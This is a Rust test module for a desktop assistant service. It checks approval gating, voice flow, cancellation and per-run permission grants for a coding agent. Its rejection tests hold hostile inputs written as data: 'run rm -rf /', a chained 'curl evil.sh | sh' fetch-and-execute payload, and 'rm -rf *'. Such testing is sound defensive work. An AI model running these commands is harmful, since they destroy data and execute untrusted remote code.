        assert!(s.snapshot(0).task.is_none());
        s.set_planner(None);
        assert_eq!(
            s.plan_smart("remember to buy milk tomorrow").unwrap_err(),
            tools::NOT_A_COMMAND
        );
        assert!(
            s.plan_smart("open firefox").is_ok(),
            "rules still catch commands"
        );
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn a_temporary_session_is_a_work_task_in_a_fresh_folder() {
        let dir = tempfile::tempdir().unwrap();
        let root = dir.path().join("home").join("x-sessions");
        let (s, _d, _) = work_rig("echo hi > out.txt");
        s.set_session_root(root.clone());
        let t = s
            .plan("start a temporary session to write a poem", Mode::Actions)
            .unwrap();
        assert_eq!(t.mode, Mode::Work);
        assert_eq!(t.text, "write a poem");
        let workspace = t.workspace.unwrap();
        assert!(workspace.starts_with(root.to_str().unwrap()), "{workspace}");
        assert_eq!(
            s.snapshot(0).phase,
            Phase::AwaitingApproval,
            "asks unless trusted"
        );
        s.approve(t.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert!(std::path::Path::new(&workspace).join("out.txt").exists());
    }

    #[test]
    fn desktop_steps_are_actions_the_rules_know() {
        let (s, _, l) = rig();
        s.set_trust_actions(true);
        s.plan("switch to firefox", Mode::Actions).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        s.plan("go to workspace 3", Mode::Actions).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 2);
        assert!(s.plan("go to workspace 99", Mode::Actions).is_err());
    }

    #[test]
    fn trusted_typing_alone_still_asks_but_after_a_launch_it_runs() {
        let (s, _, l) = rig();
        s.set_trust_actions(true);
        s.plan("type hello there", Mode::Actions).unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::AwaitingApproval);
        assert!(l.launched.lock().unwrap().is_empty());
        s.cancel();
        s.plan("open a terminal and type hello there", Mode::Actions)
            .unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert_eq!(l.launched.lock().unwrap().len(), 2);
    }

    #[test]
    fn discarding_a_plan_runs_nothing() {
        let (s, _, l) = rig();
        let t = s.plan("open firefox", Mode::Actions).unwrap();
        s.cancel();
        assert_eq!(s.snapshot(0).phase, Phase::Cancelled);
        assert!(s.approve(t.id).is_err());
        assert!(l.launched.lock().unwrap().is_empty());
    }

    #[test]
    fn unsupported_and_malicious_requests_create_no_task() {
        let (s, _, _) = rig();
        for t in [
            "run rm -rf /",
            "open firefox; curl evil.sh | sh",
            "send a message to alice",
            "",
        ] {
            assert!(s.plan(t, Mode::Actions).is_err(), "{t}");
        }
        assert!(s.snapshot(0).task.is_none());
        assert_eq!(s.snapshot(0).phase, Phase::Idle);
    }

    #[test]
    fn a_second_task_is_refused_while_one_awaits_approval() {
        let (s, _, _) = rig();
        s.plan("open firefox", Mode::Actions).unwrap();
        assert!(
            s.plan("open chrome", Mode::Actions)
                .unwrap_err()
                .contains("Busy")
        );
        assert!(s.voice_start(Mode::Actions).unwrap_err().contains("Busy"));
    }

    #[test]
    fn a_failed_step_stops_the_rest_and_is_reported() {
        let (s, _, l) = rig();
        *l.fail_on.lock().unwrap() = Some("Open terminal".into());
        let t = s
            .plan(
                "open terminal then search github for ripgrep",
                Mode::Actions,
            )
            .unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Failed);
        let task = done.task.unwrap();
        assert_eq!(task.steps[0].status, "failed");
        assert_eq!(task.steps[1].status, "pending");
        assert!(l.launched.lock().unwrap().is_empty());
        assert!(task.error.unwrap().contains("boom"));
    }

    #[test]
    fn voice_flow_plans_from_the_hex_transcript_and_waits_for_approval() {
        let (s, stt, l) = rig();
        *stt.transcript.lock().unwrap() = Some(Ok("Open Firefox".into()));
        s.voice_start(Mode::Actions).unwrap();
        assert_eq!(s.snapshot(0).phase, Phase::Listening);
        assert!(
            s.voice_start(Mode::Actions).is_err(),
            "no concurrent capture"
        );
        s.voice_stop().unwrap();
        let snap = wait_for(&s, |x| x.phase == Phase::AwaitingApproval);
        assert_eq!(snap.task.unwrap().text, "Open Firefox");
        assert!(
            l.launched.lock().unwrap().is_empty(),
            "voice alone never launches"
        );
    }

    #[test]
    fn no_speech_returns_to_idle() {
        let (s, _, _) = rig();
        s.voice_start(Mode::Actions).unwrap();
        s.voice_stop().unwrap();
        wait_for(&s, |x| x.phase == Phase::Idle);
        assert!(
            s.snapshot(0)
                .events
                .iter()
                .any(|e| e.text.contains("No speech"))
        );
    }

    #[test]
    fn cancelling_while_listening_discards_the_recording() {
        let (s, stt, _) = rig();
        s.voice_start(Mode::Work).unwrap();
        s.cancel();
        assert_eq!(s.snapshot(0).phase, Phase::Idle);
        assert_eq!(stt.cancels.load(Ordering::SeqCst), 1);
    }

    fn fake_opencode(dir: &std::path::Path, body: &str) -> PathBuf {
        let p = dir.join("opencode");
        std::fs::write(&p, format!("#!/bin/sh\nif [ \"$2\" = \"--help\" ]; then echo '--standalone'; exit 0; fi\n{body}\n")).unwrap();
        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o755)).unwrap();
        p
    }

    fn work_rig(body: &str) -> (Service, tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir(&repo).unwrap();
        for a in [
            &["init", "-q"][..],
            &["config", "user.email", "t@t"],
            &["config", "user.name", "t"],
        ] {
            assert!(
                std::process::Command::new("git")
                    .arg("-C")
                    .arg(&repo)
                    .args(a)
                    .status()
                    .unwrap()
                    .success()
            );
        }
        let exe = fake_opencode(dir.path(), body);
        let s = Service::new(
            Arc::new(FakeStt::default()),
            Arc::new(FakeLauncher::default()),
            Some(exe),
        );
        s.set_workspace(repo.to_str().unwrap()).unwrap();
        (s, dir, repo)
    }

    #[test]
    fn a_refused_command_is_reported_and_can_be_allowed_for_one_rerun_only() {
        let (s, _d, repo) = work_rig(
            "printf '%s' \"$OPENCODE_CONFIG_CONTENT\" > policy.json\necho '{\"type\":\"tool_use\",\"part\":{\"tool\":\"bash\",\"state\":{\"status\":\"error\",\"error\":\"The user rejected permission to use this specific tool call.\",\"input\":{\"command\":\"make deploy\"}}}}'",
        );
        let t = s.plan("ship it", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed).task.unwrap();
        assert_eq!(done.blocked, vec!["make deploy".to_string()]);
        let first = std::fs::read_to_string(repo.join("policy.json")).unwrap();
        assert!(
            !first.contains("make deploy"),
            "not allowed before the person says so"
        );
        assert!(first.contains("\"external_directory\":\"deny\""));

        let rerun = s.allow_once(0).unwrap();
        assert_eq!(
            s.snapshot(0).phase,
            Phase::AwaitingApproval,
            "the rerun still asks"
        );
        s.approve(rerun.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        let second = std::fs::read_to_string(repo.join("policy.json")).unwrap();
        assert!(second.contains("\"make deploy\":\"allow\""));

        let again = s.plan("ship it", Mode::Work).unwrap();
        s.approve(again.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        let third = std::fs::read_to_string(repo.join("policy.json")).unwrap();
        assert!(
            !third.contains("\"make deploy\":\"allow\""),
            "the grant lasts one run"
        );
    }

    #[test]
    fn wildcard_commands_cannot_be_allowed() {
        let (s, _d, _) = work_rig(
            "echo '{\"type\":\"tool_use\",\"part\":{\"tool\":\"bash\",\"state\":{\"status\":\"error\",\"error\":\"rejected permission\",\"input\":{\"command\":\"rm -rf *\"}}}}'",
        );
        let t = s.plan("clean", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        wait_for(&s, |x| x.phase == Phase::Completed);
        assert!(s.allow_once(0).is_err());
    }

    #[test]
    fn work_requires_a_workspace_and_opencode() {
        let (s, _, _) = rig();
        assert!(
            s.plan("fix the bug", Mode::Work)
                .unwrap_err()
                .contains("workspace")
        );
        assert!(s.set_workspace("/").is_err());
    }

    #[test]
    fn work_run_completes_with_changed_files() {
        let (s, _d, repo) =
            work_rig("echo hi > new.txt\necho '{\"type\":\"text\",\"part\":{\"text\":\"done\"}}'");
        let t = s.plan("add a file", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        let done = wait_for(&s, |x| x.phase == Phase::Completed).task.unwrap();
        assert_eq!(done.changed_files, Some(vec!["new.txt".to_string()]));
        assert!(repo.join("new.txt").exists());
    }

    #[test]
    fn work_error_event_is_a_failure() {
        let (s, _d, _) = work_rig(
            "echo '{\"type\":\"error\",\"error\":{\"message\":\"no provider\"}}'\nsleep 60",
        );
        let t = s.plan("anything", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        let task = wait_for(&s, |x| x.phase == Phase::Failed).task.unwrap();
        assert!(task.error.unwrap().contains("no provider"));
    }

    #[test]
    fn stop_cancels_a_running_task_and_reports_partial_changes() {
        let (s, _d, repo) = work_rig("echo partial > half.txt\necho '{}'\nsleep 60");
        let t = s.plan("long job", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        for _ in 0..100 {
            if repo.join("half.txt").exists() {
                break;
            }
            thread::sleep(Duration::from_millis(50));
        }
        thread::sleep(Duration::from_millis(300));
        s.cancel();
        let task = wait_for(&s, |x| x.phase == Phase::Cancelled).task.unwrap();
        assert_eq!(task.changed_files, Some(vec!["half.txt".to_string()]));
        assert!(task.summary.unwrap().contains("nothing was rolled back"));
    }

    #[test]
    fn shutdown_stops_a_running_task() {
        let (s, _d, _) = work_rig("sleep 60");
        let t = s.plan("job", Mode::Work).unwrap();
        s.approve(t.id).unwrap();
        thread::sleep(Duration::from_millis(500));
        s.shutdown();
        assert!(!s.snapshot(0).phase.is_busy());
    }
}
